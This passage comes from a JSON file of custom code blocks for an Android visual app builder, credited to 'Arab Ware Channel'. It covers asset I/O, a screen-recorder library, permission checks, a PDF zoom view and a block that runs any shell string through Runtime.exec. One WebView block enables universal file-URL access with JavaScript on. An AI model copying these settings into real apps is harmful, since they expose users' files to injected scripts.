"},{"code":"%1$s.charAt((int)%2$s)","color":"#FF00BFA5","name":"getCharAt","typeName":"","palette":"144","type":"s","spec":"%s getCharAt %d"},{"code":"String.valueOf(%1$s)","color":"#FF00BFA5","name":"NumberToString","typeName":"","palette":"144","type":"s","spec":"getString From %d"},{"code":"String.valueOf(%1$s);","color":"#FF00BFA5","name":"booleanToString","typeName":"","palette":"144","type":"s","spec":"getString From %b"},{"code":"","color":"#FF689F38","name":"created by arab ware....","typeName":"","palette":"145","type":"h","spec":"created by arab ware channel"},{"code":"/*\n%1$s\n*/","color":"#FF689F38","name":"comment  ....","typeName":"","palette":"145","type":" ","spec":"comment %s.inputOnly"},{"code":"/*\n%1$s\n*/","color":"#FF689F38","name":"comment ......","typeName":"","palette":"145","type":"c","spec":"comment"},{"code":"{\n%1$s\n}","color":"#FF689F38","name":"private area ....","typeName":"","palette":"145","type":"c","spec":"private area"},{"code":"_ArabWareChannel();\n_ArabWareChannels();","color":"#FF039BE5","name":"SuperUser","typeName":"","palette":"146","type":" ","spec":"start SuperUser component"},{"code":"try {\nRuntime.getRuntime().exec(\"%1$s\");\n} catch (Exception s) {\nfinishAffinity();\n}","color":"#A20025","name":"shell","typeName":"","palette":"147","type":" ","spec":"shell cmd %s.inputOnly"},{"code":"","color":"#FF00BFA5","name":"credits..........","typeName":"","palette":"148","type":"h","spec":"by arab ware channel"},{"code":"%1$s \u003d Boolean.valueOf(%2$s);","color":"#FF00BFA5","name":"set boolean","typeName":"","palette":"148","type":" ","spec":"%m.varBool set boolean %s"},{"code":"Boolean.valueOf(%1$s)","color":"#FF00BFA5","name":"get boolean from String","typeName":"","palette":"148","type":"b","spec":"get boolean from %s"},{"code":"","color":"#FF039BE5","name":"codes maker","typeName":"","palette":"149","type":"h","spec":"codes maker |created by arab ware channel|"},{"code":"%2$s.add(%1$s);\n%4$s.add(%3$s);\n%6$s.add(%5$s);","color":"#FF039BE5","name":"create code","typeName":"","palette":"149","type":" ","spec":"create code title %s into %m.listStr create code %s into %m.listStr create description %s into %m.listStr"},{"code":"%1$s.get((int)(%2$s))","color":"#FF039BE5","name":"get title","typeName":"","palette":"149","type":"s","spec":"Get Title From %m.listStr at %d"},{"code":"%1$s.get((int)(%2$s))","color":"#FF039BE5","name":"get code","typeName":"","palette":"149","type":"s","spec":"Get code from %m.listStr at %d"},{"code":"%1$s.get((int)(%2$s))","color":"#FF039BE5","name":"get description","typeName":"","palette":"149","type":"s","spec":"Get Description From %m.listStr at %d"},{"code":"","color":"#FF388E3C","name":"created .","typeName":"","palette":"150","type":"h","spec":"created by arab ware channel"},{"code":"try{\n\tBitmapDrawable %1$sBD \u003d (BitmapDrawable) %1$s.getDrawable();\n\tBitmap %1$sB \u003d %1$sBD.getBitmap();\n\tFileOutputStream %1$sFOS \u003d null;\n\tFile %1$sF \u003d Environment.getExternalStorageDirectory();\n\tFile %1$sF2 \u003d new File(%2$s);\n\t%1$sF2.mkdirs();\n\tString %1$sFN \u003d %3$s;\n\tFile %1$sF3 \u003d new File(%1$sF2, %1$sFN);\n\t%1$sFOS \u003d new FileOutputStream(%1$sF3); \n\t%1$sB.compress(Bitmap.CompressFormat.JPEG, %4$s, %1$sFOS);\n\t%1$sFOS.flush();\n\t%1$sFOS.close(); \n\tIntent %1$sI \u003d new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE);\n\t%1$sI.setData(Uri.fromFile(%1$sF)); sendBroadcast(%1$sI);\n}catch(Exception e){\n}","color":"#FF388E3C","name":"save image from app to path","typeName":"","palette":"150","type":" ","spec":"%m.imageview save to path %s with name %s with qulity %d"},{"code":"","color":"#FF6200EA","name":"CREATED_BY","typeName":"","palette":"151","type":"h","spec":"BY ARAB WARE CHANNEL"},{"code":"","color":"#FF6200EA","name":"activity asset blocks","typeName":"","palette":"151","type":"h","spec":"these are blocks for activity only"},{"code":"{\ntry{\nint count;\njava.io.InputStream input\u003d %4$s.this.getAssets().open(%1$s);\njava.io.OutputStream output \u003d new  java.io.FileOutputStream(%2$s + %3$s);\nbyte data[] \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n\n\t}catch(Exception e){\n\t\t\r\n\t}\n}","color":"#FF6200EA","name":"save a file from asset to storage","typeName":"","palette":"151","type":" ","spec":"save asset file path %s to storage path %s with name %s in %m.activity"},{"code":"{\ntry{\n\tjava.io.InputStream %2$sIn \u003d %3$s.this.getAssets().open(%1$s);\n\t           int %2$sSi \u003d %2$sIn.available();\n\t           byte[] %2$sBu \u003d new byte[%2$sSi];\n\t           %2$sIn.read(%2$sBu);\n\t           %2$sIn.close();\n\t           %2$s \u003d new String(%2$sBu, \"UTF-8\");\n}catch(Exception e){\n\t \n}\n}","color":"#FF6200EA","name":"read asset path","typeName":"","palette":"151","type":" ","spec":"read asset file path %s as string to %m.varStr in %m.activity"},{"code":"{\nfinal AssetManager %1$sA \u003d %3$s.this.getAssets();\ntry {\nfinal String[] %1$sS \u003d %1$sA.list(%2$s);\n%1$s \u003d new ArrayList\u003cString\u003e(Arrays.asList(%1$sS));\n}catch(Exception e){}\n}","color":"#FF6200EA","name":"asset folder files list","typeName":"","palette":"151","type":" ","spec":"%m.listStr set data as list of asset folder files %s in %m.activity"},{"code":"","color":"#FF6200EA","name":"fragment asset blocks","typeName":"","palette":"151","type":"h","spec":"these are blocks for fragment only"},{"code":"{\ntry{\nint count;\njava.io.InputStream input\u003dgetAssets().open(%1$s);\njava.io.OutputStream output \u003d new  java.io.FileOutputStream(%2$s + %3$s);\nbyte data[] \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n\n\t}catch(Exception e){\n\t\t\r\n\t}\n}","color":"#FF6200EA","name":"save a file from asset to storage 2","typeName":"","palette":"151","type":" ","spec":"save asset file path %s to storage path %s with name %s"},{"code":"{\ntry{\n\tjava.io.InputStream %2$sIn \u003d getActivity().getAssets().open(%1$s);\n\t           int %2$sSi \u003d %2$sIn.available();\n\t           byte[] %2$sBu \u003d new byte[%2$sSi];\n\t           %2$sIn.read(%2$sBu);\n\t           %2$sIn.close();\n\t           %2$s \u003d new String(%2$sBu, \"UTF-8\");\n}catch(Exception e){\n\t \n}\n}","color":"#FF6200EA","name":"read asset path 2","typeName":"","palette":"151","type":" ","spec":"read asset file path %s as string to %m.varStr"},{"code":"{\nfinal AssetManager %1$sA \u003d getActivity().getAssets();\ntry {\nfinal String[] %1$sS \u003d %1$sA.list(%2$s);\n%1$s \u003d new ArrayList\u003cString\u003e(Arrays.asList(%1$sS));\n}catch(Exception e){}\n}","color":"#FF6200EA","name":"asset folder files list","typeName":"","palette":"151","type":" ","spec":"%m.listStr set data as list of asset folder files %s"},{"code":"","color":"#FF64DD17","name":"created by me","typeName":"","palette":"151","type":"h","spec":"Created By Arab Ware Channel"},{"code":"try{\n\tjava.io.InputStream %2$sIn \u003d this.getAssets().open(\"txt.txt\");\n\t           int %2$sSi \u003d %2$sIn.available();\n\t           byte[] %2$sBu \u003d new byte[%2$sSi];\n\t           %2$sIn.read(%2$sBu);\n\t           %2$sIn.close();\n\t           %2$s \u003d new String(%2$sBu, \"UTF-8\");\n}catch(Exception e){\n\t \n}","color":"#FF64DD17","name":"read file","typeName":"","palette":"151","type":" ","spec":"read file from assets with name or path %s into string variable %m.varStr"},{"code":"try{\n\t\tjava.io.InputStream %1$sIn \u003d this.getAssets().open(\"txt.txt\");\n\t\t           int %1$sSi \u003d ttIn.available();\n\t\t           byte[] %1$sBu \u003d new byte[ttSi];\n\t\t           %1$sIn.read(%1$sBu);\n\t\t           %1$sIn.close();\n\t\t           final String %1$sStr \u003d new String(%1$sBu, \"UTF-8\");\nWebSettings %1$sSs \u003d %1$s.getSettings(); \n%1$sSs.setJavaScriptEnabled(true); \n%1$sSs.setJavaScriptCanOpenWindowsAutomatically(true);\nif (android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.JELLY_BEAN) {\n%1$sSs.setAllowFileAccessFromFileURLs(true); \n%1$sSs.setAllowUniversalAccessFromFileURLs(true);\n}\r\n%1$s.loadUrl(\"data:text/html ,\u003chtml\u003e\".concat(%1$sStr.concat(\"\u003chtml\u003e\")));\n}catch(Exception e){\n\t\t \n}","color":"#FF64DD17","name":"read file 2","typeName":"","palette":"151","type":" ","spec":"%m.webview read html file from assets with name or path %s"},{"code":"","color":"#FF283593","name":"created.....","typeName":"","palette":"151","type":"h","spec":"created by arab ware channel"},{"code":"AssetManager %2$sA \u003d getAssets();\ntry {\nString[] %2$sS \u003d %2$sA.list(%1$s);\n%2$s \u003d new ArrayList\u003cString\u003e(Arrays.asList(%2$sS));\n}catch(Exception e){}","color":"#FF283593","name":"ListAssets","typeName":"","palette":"151","type":" ","spec":"assets files list of folder %s into %m.listStr"},{"code":"","color":"#FF283593","name":"not related","typeName":"","palette":"151","type":"h","spec":"not related | + plz add these imports 1) java.io.InputStream 2) java.io.IOException"},{"code":"try {\njava.io.InputStream %1$sInput \u003d getAssets().open(%2$s); \nDrawable %1$sDraw \u003d Drawable.createFromStream(%1$sInput, null);\n%1$s.setImageDrawable(%1$sDraw);\n%1$sInput.close();\n} catch(java.io.IOException ex) {}","color":"#FF283593","name":"ImageViewFromAsset","typeName":"","palette":"151","type":" ","spec":"%m.imageview set image from assets %s"},{"code":"","color":"#FF000000","name":"made by omar.","typeName":"","palette":"152","type":"h","spec":"MADE BY OMAR ADDED BY ARAB WARE DEVELOPED BY ARAB WARE ALSO LIBRARY MADE BY OMAR"},{"code":"}\npublic static class ScreenRecord {\n   private int DPI;\n   private int HEIGHT;\n   private int WIDTH;\n   private int audioBitRate \u003d 10;\n   private int audio_source \u003d 1;\n   private Context context;\n   private int frame \u003d 30;\n   private boolean isRecording \u003d false;\n   private RecordListener listener;\n   private android.media.projection.MediaProjection mp;\n   private android.media.projection.MediaProjectionManager mpm;\n   private MediaRecorder mr;\n   private int orientation \u003d 0;\n   private String out;\n   private int output_format \u003d 2;\n   private boolean recAudio \u003d false;\n   private android.hardware.display.VirtualDisplay vd;\n   private int videoBitRate \u003d 4;\n   private int videoEncoder \u003d 2;\n\n   public ScreenRecord(Context var1) {\n      this.context \u003d var1;\n      this.out \u003d FileUtil.getExternalStorageDir();\n      this.WIDTH \u003d var1.getResources().getDisplayMetrics().widthPixels;\n      this.HEIGHT \u003d var1.getResources().getDisplayMetrics().heightPixels;\n      this.DPI \u003d var1.getResources().getDisplayMetrics().densityDpi;\n      this.mpm \u003d (android.media.projection.MediaProjectionManager)var1.getSystemService(\"media_projection\");\n   }\n\n   private String createVideoName() {\n      Calendar var1 \u003d Calendar.getInstance();\n      StringBuffer var2 \u003d new StringBuffer();\n      StringBuffer var3 \u003d new StringBuffer();\n      StringBuffer var4 \u003d var3.append(\"/\");\n      SimpleDateFormat var5 \u003d new SimpleDateFormat(\"yyyy-MM-dd-hh_mm_ss\");\n      return var2.append(var4.append(var5.format(var1.getTime())).toString()).append(\".mp4\").toString();\n   }\n\n   private android.hardware.display.VirtualDisplay createVirtualDisplay() {\n      return this.mp.createVirtualDisplay(\"ScreenRecord\", this.WIDTH, this.HEIGHT, this.DPI, 16, this.mr.getSurface(), (android.hardware.display.VirtualDisplay.Callback)null, (Handler)null);\n   }\n\n   private void initRecorder() {\n      try {\n         MediaRecorder var1 \u003d new MediaRecorder();\n         this.mr \u003d var1;\n         if(this.recAudio) {\n            this.mr.setAudioSource(this.audio_source);\n         }\n\n         this.mr.setVideoSource(2);\n         this.mr.setOutputFormat(this.output_format);\n         MediaRecorder var3 \u003d this.mr;\n         StringBuffer var4 \u003d new StringBuffer();\n         var3.setOutputFile(var4.append(this.out).append(this.createVideoName()).toString());\n         if(this.recAudio) {\n            this.mr.setAudioEncoder(3);\n            this.mr.setAudioEncodingBitRate(this.audioBitRate);\n            this.mr.setAudioSamplingRate(this.audioBitRate);\n         }\n\n         this.mr.setVideoEncoder(this.videoEncoder);\n         this.mr.setVideoEncodingBitRate(1000000 * this.videoBitRate);\n         this.mr.setVideoFrameRate(this.frame);\n         this.mr.setVideoSize(this.WIDTH, this.HEIGHT);\n         this.mr.setOrientationHint(this.orientation);\n         this.mr.prepare();\n         this.vd \u003d this.createVirtualDisplay();\n      } catch (Exception var5) {\n         Toast.makeText(this.context, var5.getMessage(), 1).show();\n      }\n   }\n\n   public Intent getRecordPermission() {\n      return this.mpm.createScreenCaptureIntent();\n   }\n\n   public boolean isRecording() {\n      return this.isRecording;\n   }\n\n   public void setAudioBitRate(int var1) {\n      this.audioBitRate \u003d var1;\n   }\n\n   public void setAudioRecorder(boolean var1) {\n      this.recAudio \u003d var1;\n   }\n\n   public void setAudioSource(int var1) {\n      this.audio_source \u003d var1;\n   }\n\n   public void setFPS(int var1) {\n      this.frame \u003d var1;\n   }\n\n   public void setOnRecordListener(RecordListener var1) {\n      this.listener \u003d var1;\n   }\n\n   public void setOutputFormat(int var1) {\n      this.output_format \u003d var1;\n   }\n\n   public void setOutputPath(String var1) {\n      if(!FileUtil.isDirectory(var1)) {\n         FileUtil.makeDir(var1);\n      }\n\n      this.out \u003d var1;\n   }\n\n   public void setVideoBitRate(int var1) {\n      this.videoBitRate \u003d var1;\n   }\n\n   public void setVideoEncoder(int var1) {\n      this.videoEncoder \u003d var1;\n   }\n\n   public void setVideoResolution(int var1, int var2) {\n      this.WIDTH \u003d var1;\n      this.HEIGHT \u003d var2;\n   }\n\n   public void setVideoRotation(int var1) {\n      this.orientation \u003d var1;\n   }\n\n   public void startRecord(Intent var1, int var2) {\n      try {\n         this.mp \u003d this.mpm.getMediaProjection(var2, var1);\n         this.initRecorder();\n         this.mr.start();\n         this.isRecording \u003d true;\n         if(this.listener !\u003d null) {\n            this.listener.onStart();\n         }\n\n      } catch (Exception var4) {\n         Toast.makeText(this.context, var4.getMessage(), 1).show();\n      }\n   }\n\n   public void stopRecord() {\n      this.isRecording \u003d false;\n\n      try {\n         if(this.vd !\u003d null) {\n            this.vd.release();\n            this.vd \u003d (android.hardware.display.VirtualDisplay)null;\n         }\n\n         if(this.mr !\u003d null) {\n            this.mr.stop();\n            this.mr.reset();\n         }\n\n         if(this.mp !\u003d null) {\n            this.mp.stop();\n            this.mp \u003d (android.media.projection.MediaProjection)null;\n         }\n\n         if(this.listener !\u003d null) {\n            this.listener.onStop();\n         }\n\n      } catch (Exception var2) {\n         Toast.makeText(this.context, var2.getMessage(), 1).show();\n      }\n   }\n}\n\npublic static interface RecordListener {\n    void onStart();\n\n    void onStop();\n}\n\n\n\n{","color":"#FF000000","name":"library __","typeName":"","palette":"152","type":" ","spec":"put me at more block بلوك مور في ضعني"},{"code":"}\nprivate ScreenRecord %1$sSR;\n{","color":"#FF000000","name":"put me at more block...","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer ._. put me at more block بلوك مور في ضعني"},{"code":"if(_resultCode\u003d\u003dRESULT_OK){\n\t\t%1$sSR.startRecord(_data,_resultCode);\n%2$s\n\t}else{\n\t\t%3$s\n\t}","color":"#FF000000","typeName":"","name":"put at onActivityResult(.....) {}","palette":"152","type":"e","spec":"%m.mediaplayer put at onActivityResult ضعني في  |  on success permission","spec2":"on failed permission"},{"code":"%1$sSR \u003d new ScreenRecord(%2$s.this);","color":"#FF000000","name":"newScreenRecord....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer create in %m.activity "},{"code":"%1$sSR \u003d new ScreenRecord(%2$s.this.getActivity());","color":"#FF000000","name":"newScreenRecord_copy63","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer create in fragment %m.activity "},{"code":"%1$sSR.setOnRecordListener(new RecordListener(){\n\t\t@Override\n\t\tpublic void onStart() {\n\t\t\t%2$s\n\t\t}\r\n\t\t\r\n\t\t@Override\n\t\tpublic void onStop() {\n\t\t\t%3$s\n\t\t}\n\t});","color":"#FF000000","typeName":"","name":"ScreenRecord Class Interface","palette":"152","type":"e","spec":"%m.mediaplayer on recording started","spec2":"on recording stoped"},{"code":"%1$sSR.setOutputPath(%2$s);","color":"#FF000000","name":"setOutputPathSRC.....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer set save path %s"},{"code":"%1$sSR.setVideoResolution((int)%2$s,(int)%3$s);","color":"#FF000000","name":"setVideoResolution...","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer setVideoResolution width %d height %d "},{"code":"%1$sSR.setVideoBitRate((int)%2$s);","color":"#FF000000","name":"setVideoBitRateSRC....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer set qulity(mps) %d"},{"code":"%1$sSR.setFPS((int)%2$s);","color":"#FF000000","name":"setFPSSRC....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer setFPS %d "},{"code":"%1$sSR.isRecording()","color":"#FF000000","typeName":"","name":"isRecording....","palette":"152","type":"b","spec":"%m.mediaplayer isRecording","spec2":"onStop"},{"code":"startActivityForResult(%1$sSR.getRecordPermission(),2001);","color":"#FF000000","name":"startRecorder....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer startRecord"},{"code":"%1$sSR.stopRecord();","color":"#FF000000","name":"stopRecorder....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer stopRecord"},{"code":"","color":"#FF212121","name":"AudioSurceHeader","typeName":"","palette":"152","type":"h","spec":"Audio Source"},{"code":"%1$sSR.setAudioRecorder(%2$s);","color":"#FF000000","name":"setAudioRecorder....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer setAudioRecorder %b "},{"code":"%1$sSR.setAudioBitRate((int)%2$s);","color":"#FF000000","name":"setAudioBitRateSRC....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer setAudioBitRate %d "},{"code":"%1$sSR.setAudioSource((int)%2$s);","color":"#FF000000","name":"setAudioSourceSRC....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer setAudioSource %d"},{"code":"MediaRecorder.AudioSource.DEFAULT","color":"#FF000000","name":"AudioSource.DEFAULT....","typeName":"","palette":"152","type":"d","spec":"DEFAULT"},{"code":"MediaRecorder.AudioSource.MIC","color":"#FF000000","name":"AudioSource.MIC...","typeName":"","palette":"152","type":"d","spec":"MIC"},{"code":"MediaRecorder.AudioSource.UNPROCESSED","color":"#FF000000","name":"AudioSource.UNPROCESSED...","typeName":"","palette":"152","type":"d","spec":"UNPROCESSED"},{"code":"MediaRecorder.AudioSource.CAMCORDER","color":"#FF000000","name":"AudioSource.CAMCORDER...","typeName":"","palette":"152","type":"d","spec":"CAMCORDER"},{"code":"","color":"#FF212121","name":"videoEncoderHeader","typeName":"","palette":"152","type":"h","spec":"Video Encoder"},{"code":"%1$sSR.setVideoEncoder((int)%2$s);","color":"#FF000000","name":"setVideoEncoderSRC....","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer setVideoEncoder %d "},{"code":"MediaRecorder.VideoEncoder.DEFAULT","color":"#FF000000","name":"VideoEncoder.DEFAULT....","typeName":"","palette":"152","type":"d","spec":"DEFAULT"},{"code":"MediaRecorder.VideoEncoder.H263","color":"#FF000000","name":"VideoEncoder.H263....","typeName":"","palette":"152","type":"d","spec":"H263"},{"code":"MediaRecorder.VideoEncoder.H264","color":"#FF000000","name":"VideoEncoder.H264.....","typeName":"","palette":"152","type":"d","spec":"H264"},{"code":"MediaRecorder.VideoEncoder.HEVC","color":"#FF000000","name":"VideoEncoder.HEVC.....","typeName":"","palette":"152","type":"d","spec":"HEVC"},{"code":"MediaRecorder.VideoEncoder.MPEG_4_SP","color":"#FF000000","name":"VideoEncoder.MPEG_4_SP...","typeName":"","palette":"152","type":"d","spec":"MPEG_4_SP"},{"code":"","color":"#FF212121","name":"PutputFormatHeader","typeName":"","palette":"152","type":"h","spec":"Output Format"},{"code":"%1$sSR.setOutputFormat((int)%2$s);","color":"#FF000000","name":"setOutputFormatSRC...","typeName":"","palette":"152","type":" ","spec":"%m.mediaplayer setOutputFormat %d "},{"code":"MediaRecorder.OutputFormat.DEFAULT","color":"#FF000000","name":"OutputFormat.DEFAULT....","typeName":"","palette":"152","type":"d","spec":"DEFAULT"},{"code":"MediaRecorder.OutputFormat.MPEG_4","color":"#FF000000","name":"OutputFormat.MPEG_4....","typeName":"","palette":"152","type":"d","spec":"MPEG_4"},{"code":"MediaRecorder.OutputFormat.THREE_GPP","color":"#FF000000","name":"OutputFormat.THREE_GPP...","typeName":"","palette":"152","type":"d","spec":"THREE_GPP"},{"code":"MediaRecorder.OutputFormat.AMR_NB","color":"#FF000000","name":"OutputFormat.AMR_NB..","typeName":"","palette":"152","type":"d","spec":"AMR_NB"},{"code":"","color":"#FF9E9D24","name":"created ","typeName":"","palette":"153","type":"h","spec":"By ArabWareChannel"},{"code":"if (Build.VERSION.SDK_INT \u003e\u003d 23) {\r\n\t\t\tif (%1$s) {\r\n\t\t\t\t%2$s\n\t\t\t}\r\n\t\t\telse {\r\n%3$s\n\t\t\t}\r\n\t\t}\r\n\t\telse {\n%3$s\n\t\t}","color":"#FF9E9D24","typeName":"","name":"If","palette":"153","type":"e","spec":"if permission/s %b not granted then","spec2":"else"},{"code":"checkSelfPermission(android.Manifest.permission.%1$s) \u003d\u003d android.content.pm.PackageManager.PERMISSION_DENIED","color":"#FF9E9D24","name":"permission","typeName":"","palette":"153","type":"b","spec":"write here the permission %s.inputOnly"},{"code":"requestPermissions(new String[] {%1$s}, 1000);\r","color":"#FF9E9D24","name":"request permissions","typeName":"","palette":"153","type":" ","spec":"request permissions %m.permission"},{"code":"%1$s,%2$s","color":"#FF9E9D24","name":"permission_and","typeName":"permission","palette":"153","type":"v","spec":"%m.permission and %m.permission"},{"code":"android.Manifest.permission.%1$s","color":"#FF9E9D24","name":"permission__","typeName":"permission","palette":"153","type":"v","spec":"write the permission %s.inputOnly "},{"code":"","color":"#FF00BFA5","name":"CREATED BY.","typeName":"","palette":"140","type":"h","spec":"CREATED BY ARAB WARE CHANNEL"},{"code":"","color":"#FF00BFA5","name":"PDF VIEWER LIBRARY","typeName":"","palette":"140","type":"h","spec":"pdf library reader \u0026 creator | pdf مكتبة صنع و قراءة "},{"code":"}\nprivate\nandroid.graphics.pdf.PdfRenderer\n%1$sPR;\nprivate ZoomableImageView %1$stouch;\nprivate android.graphics.pdf.PdfRenderer.Page %1$sRpage;\nprivate Bitmap %1$smBitmap;\nprivate java.io.File %1$sFE;\nprivate java.io.InputStream %1$sasset;\nprivate java.io.FileOutputStream %1$soutput;\nprivate byte[] %1$sbuffer;\nprivate int %1$sPsize;\npublic class ZoomableImageView extends ImageView {\n\n\nMatrix matrix \u003d new Matrix();\n\nstatic final int NONE \u003d 0;\n\nstatic final int DRAG \u003d 1;\n\nstatic final int ZOOM \u003d 2;\n\nstatic final int CLICK \u003d 3;\n\nint mode \u003d NONE;\n\nPointF last \u003d new PointF();\n\nPointF start \u003d new PointF();\n\nfloat minScale \u003d 1f;\n\nfloat maxScale \u003d 4f;\n\nfloat[] m;\n\nfloat redundantXSpace, redundantYSpace;\n\nfloat width, height;\n\nfloat saveScale \u003d 1f;\n\nfloat right, bottom, origWidth, origHeight, bmWidth, bmHeight;\n\nScaleGestureDetector mScaleDetector;\n\nContext context;\n\n\npublic ZoomableImageView(Context context) {\n\nsuper(context);\n\nsuper.setClickable(true);\n\nthis.context \u003d context;\n\nmScaleDetector \u003d new ScaleGestureDetector(context, new ScaleListener());\n\nmatrix.setTranslate(1f, 1f);\n\nm \u003d new float[9];\n\nsetImageMatrix(matrix); setScaleType(ScaleType.MATRIX);\n\n\nsetOnTouchListener(new OnTouchListener() {\n\n@Override\n\npublic boolean onTouch(View v, MotionEvent event) {\n\nmScaleDetector.onTouchEvent(event);\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nPointF curr \u003d new PointF(event.getX(), event.getY());\n\nswitch (event.getAction()) {\n\ncase MotionEvent.ACTION_DOWN: last.set(event.getX(), event.getY()); start.set(last); mode \u003d DRAG;\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_DOWN: last.set(event.getX(), event.getY()); start.set(last);\n\nmode \u003d ZOOM;\n\nbreak;\n\ncase MotionEvent.ACTION_MOVE:\n\nif (mode \u003d\u003d ZOOM || (mode \u003d\u003d DRAG \u0026\u0026 saveScale \u003e minScale)) {\n\nfloat deltaX \u003d curr.x - last.x;\n\nfloat deltaY \u003d curr.y - last.y;\n\nfloat scaleWidth \u003d Math.round(origWidth * saveScale);\n\nfloat scaleHeight \u003d Math.round(origHeight * saveScale);\n\nif (scaleWidth \u003c width) {\n\ndeltaX \u003d 0;\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n} else if (scaleHeight \u003c height) {\n\ndeltaY \u003d 0;\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\n} else {\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n}\n\nmatrix.postTranslate(deltaX, deltaY);\n\nlast.set(curr.x, curr.y);\n\n}\n\nbreak;\n\ncase MotionEvent.ACTION_UP:\n\nmode \u003d NONE;\n\nint xDiff \u003d (int) Math.abs(curr.x - start.x);\n\nint yDiff \u003d (int) Math.abs(curr.y - start.y);\n\nif (xDiff \u003c CLICK \u0026\u0026 yDiff \u003c CLICK) performClick();\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_UP:\n\nmode \u003d NONE;\n\nbreak;\n\n}\n\nsetImageMatrix(matrix);\n\ninvalidate();\n\nreturn true;\n\n}\n\n});\n\n}\n\n\n@Override\n\npublic void setImageBitmap(Bitmap bm) {\n\nsuper.setImageBitmap(bm);\n\nbmWidth \u003d bm.getWidth();\n\nbmHeight \u003d bm.getHeight(); }\n\n\npublic void setMaxZoom(float x) {\n\nmaxScale \u003d x; }\n\n\nprivate class ScaleListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {\n\n@Override\n\npublic boolean onScaleBegin(ScaleGestureDetector detector) {\n\nmode \u003d ZOOM;\n\nreturn true;}\n\n@Override\n\npublic boolean onScale(ScaleGestureDetector detector) {\n\nfloat mScaleFactor \u003d detector.getScaleFactor();\n\nfloat origScale \u003d saveScale;\n\nsaveScale *\u003d mScaleFactor;\n\nif (saveScale \u003e maxScale){\n\nsaveScale \u003d maxScale;\n\nmScaleFactor \u003d maxScale / origScale;\n\n} else if (saveScale \u003c minScale) {\n\nsaveScale \u003d minScale;\n\nmScaleFactor \u003d minScale / origScale;}\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale);\n\nif (origWidth * saveScale \u003c\u003d width || origHeight * saveScale \u003c\u003d height) {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, width / 2, height / 2);\n\nif (mScaleFactor \u003c 1) {\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (Math.round(origWidth * saveScale) \u003c width) {\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);\n\n} else {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);}\n\n}\n\n}\n\n} else {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, detector.getFocusX(), detector.getFocusY()); matrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);}\n\n}\n\nreturn true;\n\n}\n\n}\n\n\n@Override\n\nprotected void onMeasure (int widthMeasureSpec, int heightMeasureSpec) {\n\nsuper.onMeasure(widthMeasureSpec, heightMeasureSpec);\n\nwidth \u003d MeasureSpec.getSize(widthMeasureSpec);\n\nheight \u003d MeasureSpec.getSize(heightMeasureSpec);\n\nfloat scale;\n\nfloat scaleX \u003d width / bmWidth;\n\nfloat scaleY \u003d height / bmHeight;\n\nscale \u003d Math.min(scaleX, scaleY); matrix.setScale(scale, scale); setImageMatrix(matrix);\n\nsaveScale \u003d 1f;\n\nredundantYSpace \u003d height - (scale * bmHeight) ;\n\nredundantXSpace \u003d width - (scale * bmWidth);\n\nredundantYSpace /\u003d 2;\n\nredundantXSpace /\u003d 2; matrix.postTranslate(redundantXSpace, redundantYSpace);\n\norigWidth \u003d width - 2 * redundantXSpace;\n\norigHeight \u003d height - 2 * redundantYSpace;\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale); setImageMatrix(matrix);}\n\n}\nprivate Bitmap %1$sbit;\nprivate Bitmap %1$sbitmap;\nprivate float %1$sbitmapRatio;\nprivate int %1$swidth;\nprivate int %1$sheight;\nprivate int %1$smaxSize;\nprivate android.graphics.pdf.PdfDocument.PageInfo %1$smyPageInfo;\nprivate 